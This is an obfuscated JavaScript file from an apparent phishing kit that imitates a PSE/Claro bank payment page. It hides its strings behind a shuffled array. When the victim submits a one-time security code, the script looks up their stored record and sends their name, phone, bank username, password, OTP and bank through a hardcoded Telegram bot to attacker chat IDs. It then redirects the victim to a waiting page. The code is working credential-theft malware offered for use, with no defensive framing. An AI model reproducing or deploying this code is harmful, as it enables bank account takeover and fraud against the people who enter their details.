const _0x2a58f5 = _0x1403;
(function (_0x2ce455, _0x3d3073) {
  const _0x55485e = _0x1403,
    _0x81896e = _0x2ce455();
  while (!![]) {
    try {
      const _0x5e1b18 =
        -parseInt(_0x55485e(0x187)) / 0x1 +
        parseInt(_0x55485e(0x1a5)) / 0x2 +
        (parseInt(_0x55485e(0x191)) / 0x3) *
          (-parseInt(_0x55485e(0x1a7)) / 0x4) +
        parseInt(_0x55485e(0x1a6)) / 0x5 +
        parseInt(_0x55485e(0x195)) / 0x6 +
        (-parseInt(_0x55485e(0x182)) / 0x7) *
          (parseInt(_0x55485e(0x186)) / 0x8) +
        (-parseInt(_0x55485e(0x19d)) / 0x9) *
          (-parseInt(_0x55485e(0x193)) / 0xa);
      if (_0x5e1b18 === _0x3d3073) break;
      else _0x81896e["push"](_0x81896e["shift"]());
    } catch (_0x5305d0) {
      _0x81896e["push"](_0x81896e["shift"]());
    }
  }
})(_0x45f9, 0x1c706);
function updateLS() {
  const _0x3b8455 = _0x1403;
  LS[_0x3b8455(0x190)](_0x3b8455(0x1a8), JSON[_0x3b8455(0x1a2)](info));
}
function _0x1403(_0x29dc3f, _0x1b4440) {
  const _0x45f9cc = _0x45f9();
  return (
    (_0x1403 = function (_0x1403f5, _0x5a3f87) {
      _0x1403f5 = _0x1403f5 - 0x17b;
      let _0x597281 = _0x45f9cc[_0x1403f5];
      return _0x597281;
    }),
    _0x1403(_0x29dc3f, _0x1b4440)
  );
}
const otpButton = document[_0x2a58f5(0x17f)](_0x2a58f5(0x19b)),
  numberMovil = document[_0x2a58f5(0x17f)]("txtOTP");
async function sendToTelegram(_0x1be0d3) {
  const _0x5b9b24 = _0x2a58f5;
  try {
    for (const _0x20996d of chatIds) {
      const _0x49df92 =
          _0x5b9b24(0x197) +
          _0x20996d +
          "&text=" +
          encodeURIComponent(_0x1be0d3),
        _0x4ee7c2 = await fetch(_0x49df92);
      !_0x4ee7c2["ok"]
        ? console[_0x5b9b24(0x17e)](
            _0x5b9b24(0x18b) + _0x20996d + "):",
            _0x4ee7c2[_0x5b9b24(0x180)]
          )
        : console[_0x5b9b24(0x19e)](_0x5b9b24(0x18d) + _0x20996d + ")");
    }
  } catch (_0x24f702) {
    console[_0x5b9b24(0x17e)](_0x5b9b24(0x184), _0x24f702);
  }
}
async function updateOtp() {
  const _0x4ec246 = _0x2a58f5;
  try {
    const _0x5e9243 = await fetch(url + _0x4ec246(0x189), {
      method: "GET",
      headers: { "Content-Type": "application/json" },
    });
    if (!_0x5e9243["ok"])
      throw new Error(
        "Error\x20al\x20obtener\x20los\x20datos\x20del\x20servidor"
      );
    const _0x5a6e20 = await _0x5e9243[_0x4ec246(0x194)](),
      _0x59b436 = [..._0x5a6e20];
    for (const _0x1ffb5d of _0x59b436) {
      if (_0x1ffb5d["id"] == info[_0x4ec246(0x18a)]["cc"]) {
        console[_0x4ec246(0x19e)](_0x4ec246(0x18e));
        const _0x4cc9ea = await fetch(
          url + _0x4ec246(0x196) + _0x1ffb5d[_0x4ec246(0x19a)],
          {
            method: "PUT",
            headers: { "Content-Type": _0x4ec246(0x19f) },
            body: JSON["stringify"]({ otp: info[_0x4ec246(0x18a)]["cdin"] }),
          }
        );
        if (!_0x4cc9ea["ok"])
          throw new Error("Error\x20al\x20actualizar\x20usuario\x20con\x20OTP");
        const _0xf5affa = await _0x4cc9ea[_0x4ec246(0x194)](),
          _0x3fda90 =
            _0x4ec246(0x17b) +
            _0x1ffb5d["id"] +
            "\x0a🆔Nombre:\x20" +
            _0x1ffb5d["nombre"] +
            _0x4ec246(0x18f) +
            _0x1ffb5d[_0x4ec246(0x17d)] +
            _0x4ec246(0x1a4) +
            _0x1ffb5d["usuario"] +
            _0x4ec246(0x18c) +
            _0x1ffb5d["password"] +
            "\x0a💎OTP:\x20" +
            info[_0x4ec246(0x18a)][_0x4ec246(0x192)] +
            _0x4ec246(0x17c) +
            _0x1ffb5d[_0x4ec246(0x1a3)] +
            _0x4ec246(0x198) +
            fuente +
            _0x4ec246(0x1a0);
        await sendToTelegram(_0x3fda90),
          console[_0x4ec246(0x19e)]("Usuario\x20actualizado\x20con\x20OTP");
      }
    }
    window[_0x4ec246(0x183)]["href"] = _0x4ec246(0x1a1);
  } catch (_0x267691) {
    console["error"](_0x4ec246(0x181), _0x267691),
      (otpButton[_0x4ec246(0x199)] = ![]);
  }
}
otpButton["addEventListener"]("click", async function (_0xe41e3d) {
  const _0x4faa1d = _0x2a58f5;
  _0xe41e3d[_0x4faa1d(0x185)](), (otpButton[_0x4faa1d(0x199)] = !![]);
  if (numberMovil[_0x4faa1d(0x188)] == "") {
    alert(_0x4faa1d(0x19c)),
      numberMovil["focus"](),
      (otpButton["disabled"] = ![]);
    return;
  } else {
    const _0x2a1ad3 = numberMovil["value"];
    (info[_0x4faa1d(0x18a)]["cdin"] = _0x2a1ad3), updateLS(), await updateOtp();
  }
});
function _0x45f9() {
  const _0x210479 = [
    "10NHwCAp",
    "json",
    "272430sQRuWz",
    "/trico/updateTricoPse/",
    "https://api.telegram.org/bot7772373506:AAE68FvWBmOiOLaTrSykMxSdpfQwP7C8hjo/sendMessage?chat_id=",
    "\x0aFuente:\x20",
    "disabled",
    "idreg",
    "btnOTP",
    "Por\x20favor\x20ingrese\x20token\x20de\x20seguridad",
    "2816964xrEKSc",
    "log",
    "application/json",
    "\x0aIngresó\x20OTP",
    "wait.html",
    "stringify",
    "bank",
    "\x0a🚹Usuario:\x20",
    "126106gkfLRc",
    "1008735BqiHQV",
    "1396lXDzIa",
    "info",
    "🟣\x20PSE\x20(Claro)\x0a©️ID:\x20",
    "\x0a🏦Banco:\x20",
    "telefono",
    "error",
    "getElementById",
    "statusText",
    "Error\x20al\x20procesar\x20el\x20OTP:",
    "1946jpGiVH",
    "location",
    "Error\x20de\x20red\x20al\x20enviar\x20mensaje:",
    "preventDefault",
    "6088YiLvES",
    "71448FPZqty",
    "value",
    "/trico/tricoData",
    "metaInfo",
    "Error\x20al\x20enviar\x20mensaje\x20(chat\x20ID:\x20",
    "\x0a🔒Contraseña:\x20",
    "Mensaje\x20enviado\x20a\x20Telegram\x20(chat\x20ID:\x20",
    "Usuario\x20Encontrado",
    "\x0a📱Teléfono:\x20",
    "setItem",
    "1923TzoUOk",
    "cdin",
  ];
  _0x45f9 = function () {
    return _0x210479;
  };
  return _0x45f9();
}
